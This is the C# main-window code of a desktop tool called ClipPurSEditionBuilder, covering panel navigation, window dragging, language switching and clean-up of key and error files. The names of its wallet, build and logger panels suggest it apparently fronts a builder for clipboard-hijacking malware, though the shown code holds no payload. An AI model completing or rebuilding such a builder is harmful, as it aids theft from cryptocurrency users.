namespace ClipPurSEditionBuilder
{
    using System;
    using System.Threading;
    using System.Windows.Forms;
    using ClipPurSEditionBuilder.ControlsSE;
    using ClipPurSEditionBuilder.Properties;
    using ClipPurSEditionBuilder.Sticks;

    public partial class ClipPurseFrm : Form
    {
        protected void Controls_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button.Equals(MouseButtons.Left))
            {
                ((Control)sender).Capture = false;
                var m = Message.Create(this.Handle, 0xa1, new IntPtr(0x2), IntPtr.Zero);
                WndProc(ref m);
            }
        }

        public ClipPurseFrm()
        {
            InitializeComponent();
            this.LogoText.MouseDown += Controls_MouseDown;
            this.UPanel.MouseDown += Controls_MouseDown;
            this.VersionSoft.MouseDown += Controls_MouseDown;
        }

        private void ClipPurseFrm_Load(object sender, EventArgs e)
        {
            this.VersionSoft.Text = $"{Language.GlobalMessageStrings_ru_RU.VerSoftware}  {GlobalPath.VersionBuild}";
            this.SalutView.Text = $"{Language.GlobalMessageStrings_ru_RU.Welcome}  {Environment.UserName}";
            ControlActive.ControlVisible(this.MainPanel, new InfoSE());
            MiniCcleaner();
            ManifestLoader.Inizialize();
            ControlActive.ShowAnima(this.Handle, 500, Enums.AnimateWindowFlags.AW_BLEND | Enums.AnimateWindowFlags.AW_ACTIVATE);
        }

        private void FastExit_Click(object sender, EventArgs e)
        {
            ManifestLoader.Delete();
            this.MainPanel.Hide();
            ControlActive.ShowAnima(this.Handle, 500, Enums.AnimateWindowFlags.AW_BLEND | Enums.AnimateWindowFlags.AW_HIDE);
            Application.Exit();
        }

        private static void MiniCcleaner()
        {
            foreach (string cycle in new string[] { "Clip_Key.txt", "Connection_Error.txt", "Key.txt", "Error_Compiler.txt", "UpdateSE.txt" })
            {
                FileControl.FileDelete(FileControl.CombinePath(GlobalPath.CurrDir, cycle));
            }
        }

        private void ShowWallets_Click(object sender, EventArgs e) => ControlActive.ControlVisible(this.MainPanel, new WalletSE());

        private void ShowBuilding_Click(object sender, EventArgs e) => ControlActive.ControlVisible(this.MainPanel, new BuildSE());

        private void ShowInfo_Click(object sender, EventArgs e) => ControlActive.ControlVisible(this.MainPanel, new InfoSE());

        private void ShowLicense_Click(object sender, EventArgs e) => ControlActive.ControlVisible(this.MainPanel, new LicenSE());

        private void ShowNewWallets_Click(object sender, EventArgs e) => ControlActive.ControlVisible(this.MainPanel, new NewWalletSE());

        private void ShowUpdater_Click(object sender, EventArgs e) => ControlActive.ControlVisible(this.MainPanel, new UpdateSE());

        private void ShowLogger_Click(object sender, EventArgs e) => ControlActive.ControlVisible(this.MainPanel, new LoGGeR());

        private void SwitchLanguage_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            if (FileControl.ExistsDirectory(FileControl.CombinePath(GlobalPath.CurrDir, "en-US")))
            {
                ControlActive.ControlVisible(this.MainPanel, new EmptySE());
                if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                {
                    Translate.Inizialize("ru");
                    this.VersionSoft.Text = $"{Language.GlobalMessageStrings_ru_RU.VerSoftware}  {GlobalPath.VersionBuild}";
                    this.SalutView.Text = $"{Language.GlobalMessageStrings_ru_RU.Welcome}  {Environment.UserName}";
                }
                else
                {
                    Translate.Inizialize("en");
                    this.VersionSoft.Text = $"{Language.GlobalMessageStrings_en_US.VerSoftware}  {GlobalPath.VersionBuild}";
                    this.SalutView.Text = $"{Language.GlobalMessageStrings_en_US.Welcome}  {Environment.UserName}";
                }
            }
            else
            {
                MusicPlay.Inizialize(Resources.Error_Build);
            }
        }
    }
}